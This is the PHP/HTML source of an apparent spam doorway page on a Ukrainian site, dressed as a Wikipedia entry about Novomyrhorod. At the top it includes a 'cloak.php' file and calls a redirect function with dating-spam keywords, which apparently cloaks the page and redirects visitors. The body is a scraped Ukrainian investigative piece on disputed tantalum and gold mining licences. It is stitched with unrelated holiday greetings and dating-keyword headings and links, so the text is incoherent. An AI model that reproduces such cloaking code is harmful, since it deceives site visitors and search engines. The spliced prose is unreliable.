<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bc%d1%96%d1%81%d1%86%d0%b5%d0%b2%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%9d%d0%be%d0%b2%d0%be%d0%bc%d0%b8%d1%80%d0%b3%d0%be%d1%80%d0%be%d0%b4+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Новомиргород — Вікіпедія</title>
	<meta name="description" content="Знайомства Новомиргород. знайомства Кропивницький • знайомства Шпола • знайомства Мала Виска · Знайомства України · Знайомства Кіровоградська​." />
	<link rel="canonical" href="https://masage.od.ua/img/137/bowu-mstsev-znayomstva-novomirgorod.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/net-znayomstva-dlya-odinokih.php">знайомства для одиноких людей в Вишневе Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/377/lo-pdklyuchennya-znayomstv-kostopl.php">підключення знайомств Костопіль Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/467/pij-shvidk-znayomstva-storozhinets.php">швидкі знайомства Сторожинець Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/106/xozu-printsesa-znayomstva-v.php">принцеса знайомства в Токмак Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/240/rumy-my-sayt-znayomstv.php">мій сайт знайомств у Селидове Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Місцеві знайомства Новомиргород Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Тому фактично компанії зрештою отримали ліцензії — чітко за процедурою. Відповідно до Порядку надання спецдозволів, перед тим, як Держгеонадра починають розглядати надання спецдозволів, компанії, які хочуть видобувати копалини, мають разом із заявою додати пакет документів — у якому, серед іншого, звіт з оцінки впливу на довкілля, звіт про громадське обговорення і висновок з оцінки впливу на довкілля.</p>
<p>Заяви «Таурус Інфініті» і «Ліра Майн Мінералз» надіслали в Держгеонадра 1 та 3 липня, відповідно, і були зареєстровані в Держгеонадрах 5 липня. Однак: звіт про громадське обговорення «Ліри» датований 23 серпня , а «Таурус Інфініті» — 16 серпня ; звіт з оцінки впливу на довкілля «Ліри» опубліковано 16 липня , «Таурус Інфініті» — 10 липня ; висновок з оцінки впливу на довкілля «Ліри» опубліковано 29 серпня , а «Таурус Інфініті» — 21 серпня.</p>
<p>Крім того, і депутати обласної ради на своїй комісії 16 серпня заявили , що отримали неповний пакет документів від Держгеонадр. Таким чином, обидві компанії 5 липня не могли подати разом із заявою в Держгеонадра весь перелік документів, тому що деякі з них отримали вже після цієї дати. Та незважаючи на це, заяву Держгеонадра зареєстрували, і процес надання спецдозволів компаніям розпочався. А це — порушення процедури подачі документів на отримання спецдозволів, наполягає Софія Шутяк — провідна юридична консультантка у міжнародній благодійній організації «Екологія-Право-Людина».</p>
<p>І однозначно має бути вже на руках висновок.</p><strong><a id='b1'></a><h2>Центральна виборча комісія України - WWW відображення ІАС "Місцеві вибори "</h2></strong><p>Недоцільно і неправильно подавати документи і брати їх до уваги, розглядати Держгеонадрам, якщо висновку з оцінки впливу на довкілля немає». Такої ж думки і доцент кафедри інженерної геології і гідрогеології Одеського національного університету Сергій Кадурін. Де він повинен пояснити, хто він, що він, що за компанія, що вони хочуть робити, як вони планують це робити, — пояснює науковець-геолог. Таким чином, за словами експертів, було порушено процедуру подачі документів на отримання спецдозволів на видобуток танталу та золота компаніями «Ліра Майн Мінералз» і «Таурус Інфініті».</p>
<p>Адже висновки і звіти з оцінки впливу на довкілля та звіти про громадське обговорення були надані компаніями не разом із заявою, а пізніше. Ось що там повідомили: «У пункті 4 Примітки до Додатку 1 Порядку зазначено, що в разі відсутності у заявника, який подав до 1 вересня року Отже, Держгеонадра послалися на зміну до Порядку подачі документів, яка передбачає, що для компаній, які подали заяви до 1 вересня року, достатньо повідомлення про плановану діяльність.</p>
<p>Утім, якщо ще раз звернутися до графіку подання цими компаніями документів, стає помітної ще одна неузгодженість у датах. Зареєстровані вони в Держгеонадрах 5 липня. І так — зміна до порядку про можливість доотримання документів справді існує. Тобто, на час подачі заяв і їхньої реєстрації вона не діяла.</p>
		
	<p>Крім того, учасники проєкту «Схеми в регіонах» звернули свою увагу на ще один аспект: наскільки дослухалися до думки мешканців, домівки яких розташовані у безпосередній близькості до родовищ? Наскільки активно вони були залучені до дискусії, про що йдеться у тих же звітах про громадське обговорення, які надали компанії Держгеонадрам?</p><a id='b2'></a><h3>Навігаційне меню</h3><p>Щоб отримати відповіді на ці питання, журналісти вирушили в села Копанки й Петроострів поблизу Мостового родовища танталових руд і до сіл Клинці й Калинівка, між якими розташоване Клинцівське золоте родовище. Мостове родовище танталових руд розташоване просто під полем у Маловисківському та Новомиргородському районах. До села Копанки, що межує з родовищем, з боку селища Смоліне знімальній групі доїхати пощастило. Була суха погода, і єдина ґрунтова дорога, що веде до села, не була розмитою. Та місцеві, яких журналісти там зустріли, наполягали, що нічого не чули про громадські обговорення: «Щодо танталу я нічого не можу сказати.</p>
<p>В нас тут були громадські слухання тільки щодо літію». А сам голова села Олег Чумак каже, що дізнався і про видобуток танталу, і про те, що вже навіть відбулися слухання, лише від знімальної групи. Основну користь від видобутку танталу, вочевидь, отримає інше село поблизу — Петроострів. Принаймні у Петроострівській сільській раді знають і назву фірми — «Таурус Інфініті», і про плани цієї фірми на родовище. Голова села Тетяна Єфіменко в цілому підтримує розробку танталового родовища на ввіреній їй території.</p>
<p>Чиновниця каже, що в серпні вона разом із 16 односельчанами їздила на громадські обговорення до Кропивницького. Також і я, і жителі села, ми їздили в Кіровоград перейменований у Кропивницький — ред. Там були слухання з приводу впливу на навколишнє середовище…, — пригадує староста села Петроострів. Це все ми задавали, це все ми читали, це все можна знайти також на сайті і почитати. Тому є багато такого, що люди побоюються». Села Калинівка та Клинці важко назвати успішними, незважаючи на їхню відносну близькість до обласного центру: пару десятків кілометрів, півгодини їзди на машині — і ви в Кропивницькому.</p>
<p>Населення сіл — менше від тисячі осіб.</p><strong><a id='b3'></a><h2>Знайомства Новомиргород</h2></strong><p>Де-не-де клапті асфальтованої дороги, напівзруйновані колгоспні приміщення — все це спадок радянського минулого. Та поодинокі відремонтовані будинки. Саме між цими селами географічно розташоване Клинцівське золоте родовище. У самому селі Клинці добре обізнані з планами видобутку золота і покладають на «Ліра майн мінералз» великі сподівання. Староста села Ольга Хомутенко пояснює, що населений пункт має небагато можливостей наповнити власний бюджет, а поява приватних золотодобувачів може прогодувати селян не один рік.</p>
		
			<br><ol>
			
				<li>найкраще місце підключення в Камянка-Дніпровська Україна.</li>
			
				<li>Мовчазна згода?;</li>
			
				<li>На Кіровоградщині зареєстрували кандидатом “двійника” міського голови Новомиргорода.</li>
			
				<li>джерела знайомств поблизу Харцизьк Україна!</li>
			
				<li>.</li>
			
			</ol>
		
	<p>Каже: громадські слухання були, і компанія уже надає допомогу громаді — поки у формі презентів. Інша ситуація у селі Калинівка. Схоже, тамтешні мешканці особливої вигоди від видобутку не отримають. Ті, з ким журналістам вдалося поспілкуватися, про плани розробки родовища не знають. Заїжджають інвестори і, власне, планують розробляти оце Клинцівське — родовище. Навіть староста Світлана Скоробагата визнає: не надто обізнана про плани «Ліра Майн Мінералс» видобувати золото.</p>
		
	<p>Знає про це з чуток — але особисто з нею з цього приводу не спілкувалися. Я думаю, якщо вже буде підготовлено, тоді вже буде спілкування. А так ще нема нічого. Розвідувальні роботи тільки велись», — пояснює староста Калинівського старостинського округу. Таким чином, можна підсумувати: компанії «Таурус Інфініті» та «Ліра Майн Мінералз» таки проводили громадські обговорення.</p>
<p>Однак, по-перше, вони відбулися вже після подачі заяви в Держгеонадра. А по-друге, до них були залучені далеко не всі охочі мешканці населених пунктів, біля яких планують видобування. Не знали про ці слухання навіть деякі старости. Поблизу села Губівка на Кіровоградщині, де планують видобувати золото, розташований ліс — і невдовзі його може й не стати.</p>
<p>Ділянка, надана «Ліра Майн Мінералз», включає в себе і майже сотню гектарів лісу — каже очільниця Кіровоградського обласного управління лісового та мисливського господарства Наталія Ревенко.</p><strong><a id='b4'></a><h2>Новомиргород</h2></strong><p>Там дуже багато зауважень і питань стосовно тварин, міграції тварин. Ми побачили, що там майже 98 гектар лісу — це хвойні лісові насадження, це культури лісові, молодий ліс, простими словами, — пояснює вона журналістам. Вилучення землі повинно проходити через Кабінет міністрів України — є відповідна постанова, яка регламентує цей порядок вилучення цієї землі. І повинні бути відшкодування за вилучення землі.</p>
<p>Ми подивилися, там близько 21 мільйона гривень в держбюджет України, і окрім цього збитки, завдані лісовому господарству — тобто, це ті дерева, що будуть пошкоджені по факту». У цій історії залишилося дати відповідь лише на одне питання: хто може стояти за фірмами, яким, незважаючи на порушення встановленого законом порядку подання документів, таки вдалось отримати бажані спецдозволи? Історії компаній, які отримали право видобували золото та тантал, досить схожі. Обидві засновані восени року та на момент розгляду їхніх питань в Кіровоградській облраді мали в засновниках нікому невідомих осіб.</p>
<p>Та найцікавіше сталося вже після проведення сесійного засідання. Їх неодноразово досліджували у своїх матеріалах журналісти видання «Наші гроші». Плюс там ще кілька прізвищ у різних комбінаціях. Олександр Павлюченко був помічником колишнього народного депутата від «Народного фронту» Ігоря Котвіцького. Самого Олександра Павлюченка «Дзеркало тижня» свого часу називало «кумом Авакова». Новости» Арсен Аваков називав Ігоря Котвіцького своїм давнім приятелем, з яким свого часу мав спільний бізнес. У свою чергу Котвіцький є найдовіренішим та найближчим партнером керівника МВС Арсена Авакова саме по нафтогазодобувному бізнесу.</p>
<p>Син Віталія Якименка Павло серед інших «слуг» пройшов до Верховної Ради і наразі входить до Комітету з питань екологічної політики та природокористування. Сам депутат, з яким журналістам вдалося поспілкуватися в кулуарах Ради, про родинні успіхи в бізнесі говорить не надто охоче. А от його бізнес-партнер Олександр Настенко пояснив причини реєстрації заяв на отримання спецдозволів попри неповний пакет документів тією ж зміною до порядку, яка, як виявили журналісти, на час реєстрації документів не діяла. У разі відсутності у заявника, який подав до 1 вересня р.</p>
<p>Крім того, прессекретарка міністра повідомила, що він заперечує свою причетність до Настенка і Якименка і їхніх компаній. Він був насичений напруженою працею, глибоким змістом та звершеннями. Напередодні новорічни Бажаємо нашим вихованцям завжди бути у хорошій спортивній формі та займати лише призові місця. Вітаємо вас з професійним святом — Днем енергетика! Без енергії в світі немає життя, а відтак неможливо уявити собі людське буття чи розвиток будь-якої галузі господарства без електричної енергії, яку своєю наполегливою працею, відкритим серцем, щирою душею, долонями працьовитих рук доносять до кожної людини, кожного підприємства працівники енергетичної галузі.</p>
<p>Вдячні енергетикам за сумлінну та наполегливу працю задля забезпечення повсякденних потреб жителів громади.</p><img src="https://mistaua.com/filesup/city_map/442uk.jpg" alt="Доступність посилання" style="max-width: 480px; max-height: 480px;"/><p>Вітаємо служителів Феміди з професійним святом! Від рівня вашого професіоналізму залежить справедливість винесених рішень, а відтак і віра людей в закон. Нехай удача та професійні успіхи будуть вашими постійними супутниками у житті. Глибоко вдячні всім учасникам ліквідації наслідків найбільшої техногенної катастрофи, які виявили героїзм, самовідданість та мужність в тих екстремальних обставинах. Він нагадав, що під час розмови з Високим представником ЄС, Віце-президентом Європейської Комісії Жозепом Боррелем обговорювалося налагодження діалогу між українськими та європейськими компаніями та асоціаціями з метою прискорення інтеграції України в ланцюжки виробництва та постачання продукції.</p>
<p>Оновлений харчоблок діє! Ремонт тут не проводився вже декілька десятиліть, тому надзвичайно важливим було створення в закладі освіти на Фінансування проєкту здійснено з бюджетів різних рівнів. Всього витрачено ,4 тис.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/422/jybex-agentstvo-znayomstv.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/240/lovyn-vikonavch-sluzhbi-znayomstv.php">виконавчі служби знайомств поблизу Яворів Україна</a></li><li><a href="https://masage.od.ua/img/428/dyq-mstsev-sayti-znayomstv.php">місцеві сайти знайомств в Красилів Україна</a></li><li><a href="https://masage.od.ua/img/184/ryce-sayti-znayomstv-dlya.php">сайти знайомств для ваших близьких Дніпро Україна</a></li><li><a href="https://masage.od.ua/img/494/zed-ponad-50.php">понад 50 знайомств Миколаївка Україна</a></li><li><a href="https://masage.od.ua/img/352/lacac-naykrashe-msto.php">найкраще місто для знайомств місто в Лозова Україна</a></li><li><a href="https://masage.od.ua/img/422/mihif-pdklyuchiti-sayt.php">підключити сайт в Покров Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#b1'>Центральна виборча комісія України - WWW відображення ІАС "Місцеві вибори "</a></li>
<li><a href='#b2'>Навігаційне меню</a></li>
<li><a href='#b3'>Знайомства Новомиргород</a></li>
<li><a href='#b4'>Новомиргород</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/184/seso-bezkoshtovn-shvidksn-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>